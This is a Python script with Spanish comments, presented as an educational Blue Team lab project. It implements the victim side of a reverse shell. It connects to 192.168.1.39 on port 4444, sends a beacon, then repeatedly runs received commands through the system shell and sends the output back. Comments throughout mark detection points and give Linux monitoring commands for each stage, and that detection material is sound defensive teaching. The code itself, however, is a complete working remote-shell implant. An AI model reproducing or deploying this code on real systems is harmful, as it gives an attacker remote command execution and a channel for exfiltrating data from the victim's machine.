#!/usr/bin/env python3
# =============================================================================
# REVERSE SHELL - LADO DE LA VÍCTIMA
# PROPÓSITO: Proyecto educativo de seguridad defensiva (Blue Team)
# ADVERTENCIA: Solo usar en laboratorio aislado propio
# =============================================================================

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ IMPORTACIÓN DE LIBRERÍAS                                                │
# └─────────────────────────────────────────────────────────────────────────┘
import socket, subprocess

    # socket     → Comunicaciones de red (conectar, enviar/recibir datos)
    # subprocess → Ejecutar comandos del sistema (CRÍTICO - mayor IoC)
    
    # 🛡️ DETECCIÓN: python + subprocess = ALERTA INMEDIATA en EDR/Sysmon
    # 🛡️ MANJARO: sudo ausearch -c python3 | sudo journalctl -f

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ CREACIÓN DEL SOCKET                                                     │
# └─────────────────────────────────────────────────────────────────────────┘

    # socket.socket() → Crea un endpoint de comunicación de red
    # AF_INET         → Familia de direcciones IPv4 (ej: 192.168.1.39)
    # SOCK_STREAM     → Protocolo TCP (orientado a conexión, confiable)
    #
    # 🛡️ DETECCIÓN: La creación del socket no es visible en red
    # 🛡️ COMANDO MANJARO: sudo lsof -i -P -n | grep python
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ CONEXIÓN SALIENTE AL ATACANTE - PUNTO DE DETECCIÓN #1 ⚠️                │
# └─────────────────────────────────────────────────────────────────────────┘

    # connect()       → Inicia conexión TCP al servidor del atacante
    # 192.168.1.39    → IP del atacante (C2 server)
    # 4444            → Puerto del atacante

    # 🛡️ DETECCIÓN #1: Conexión SALIENTE a puerto 4444 (Firewall/IDS)
    # 🛡️ COMANDO MANJARO: sudo ss -antp | grep 4444
connection.connect(("192.168.1.39", 4444))

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ ENVÍO DE BEACON - PUNTO DE DETECCIÓN #2 ⚠️                              │
# └─────────────────────────────────────────────────────────────────────────┘

    # send()          → Envía datos al atacante a través del túnel TCP
    # encode('utf-8') → Convierte string a bytes (requerido en Python 3)

    # 🛡️ DETECCIÓN #2: Firma de texto "Conexion Exitosamente" (DLP/IDS)
    # 🛡️ COMANDO MANJARO: sudo tcpdump -i any port 4444 -X
connection.send("\n[+] Conexion Exitosamente Establecida\n".encode('utf-8'))

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ BUCLE PRINCIPAL - ESPERA DE COMANDOS                                    │
# └─────────────────────────────────────────────────────────────────────────┘

    # 🛡️ DETECCIÓN: Conexión TCP de LARGA DURACIÓN (> 5 minutos)
while True:
    
    # ┌─────────────────────────────────────────────────────────────────────┐
    # │ RECEPCIÓN DE COMANDOS - PUNTO DE DETECCIÓN #3                       │
    # └─────────────────────────────────────────────────────────────────────┘

        # recv(1024) → Espera y recibe hasta 1024 bytes del atacante
        
        # 🛡️ DETECCIÓN #3: Tráfico entrante en conexión establecida
        # 🛡️ COMANDO MANJARO: sudo tcpdump -i any port 4444 -n -v
    command = connection.recv(1024)
    
    # ┌─────────────────────────────────────────────────────────────────────┐
    # │ EJECUCIÓN DE COMANDO - PUNTO DE DETECCIÓN #4 ⚠️ (EL MÁS CRÍTICO)    │
    # └─────────────────────────────────────────────────────────────────────┘
    
        # check_output() → Ejecuta el comando en el sistema operativo
        # shell=True     → Ejecuta a través del shell del sistema (/bin/sh)
        
        # 🛡️ DETECCIÓN #4: python → bash/sh (auditd/EDR) - EL MAYOR IoC
        # 🛡️ COMANDO MANJARO: sudo ausearch -c python3 --start recent
    resultadosComando = subprocess.check_output(command, shell=True)
    
    # ┌─────────────────────────────────────────────────────────────────────┐
    # │ ENVÍO DE RESULTADOS - EXFILTRACIÓN ⚠️                               │
    # └─────────────────────────────────────────────────────────────────────┘
    
        # send() → Envía resultados al atacante (exfiltración)
        #
        # 🛡️ DETECCIÓN #5: Datos salientes sensibles (DLP/Wireshark)
        # 🛡️ COMANDO MANJARO: sudo tcpdump -i any port 4444 -w exfil.pcap
    connection.send(resultadosComando)